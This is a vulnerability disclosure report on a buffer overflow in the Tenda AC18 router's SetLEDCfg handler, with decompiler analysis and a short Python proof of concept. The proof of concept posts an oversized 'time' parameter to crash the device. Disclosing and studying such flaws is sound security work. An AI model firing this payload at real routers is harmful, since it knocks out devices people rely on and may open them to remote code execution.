# Shenzhen Jixiang Tengda Technology Co., Ltd. AC18 has a Buffer Overflow vulnerability

**Vulnerability URL**: [http://192.168.198.76/goform/SetLEDCfg](http://192.168.198.76/goform/SetLEDCfg)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/2683](https://www.tenda.com.cn/material/show/2683)

## Vulnerability Analysis
The Tenda AC18_V15.03.05.19(6318) firmware has a buffer overflow vulnerability in the `formsetschedled` function

![Image 1](https://github.com/zezhifu1/cve_report/blob/main/AC18/image/formSetSchedLed1.png)

This function accepts `time` from a1 via a POST request. Then, at lines 40 and 41, it calls the `strtok` function twice to extract parts of `s`. At line 44, it passes the extracted results to the `mib2utc` function without any checks. If the input parameter is too large, it will cause the buffer to overflow, which can lead to denial of service or remote code execution.  
Cross-referenced location: from the `formSetSchedLed` function, routed to `SetLEDCfg`, at line 52.

![Image 3](https://github.com/zezhifu1/cve_report/blob/main/AC18/image/formSetSchedLed2.png)

Further cross-referenced.

![Image 4](https://github.com/zezhifu1/cve_report/blob/main/AC18/image/formSetSchedLed3.png)

It can be determined that the vulnerability occurs at the page path `goform/SetLEDCfg`.

## payload
```python
from pwn import *
import requests
url = "http://192.168.198.76/goform/SetLEDCfg"
payload = 1000 * b"1" + b":30-06:30"
response = requests.post(url, data={"time" : payload})
```

# reproduce
![Image 5](https://github.com/zezhifu1/cve_report/blob/main/AC18/image/formSetSchedLed4.png)

![Image 6](https://github.com/zezhifu1/cve_report/blob/main/AC18/image/formSetSchedLed5.png)

![Image 7](https://github.com/zezhifu1/cve_report/blob/main/AC18/image/formSetSchedLed6.png)
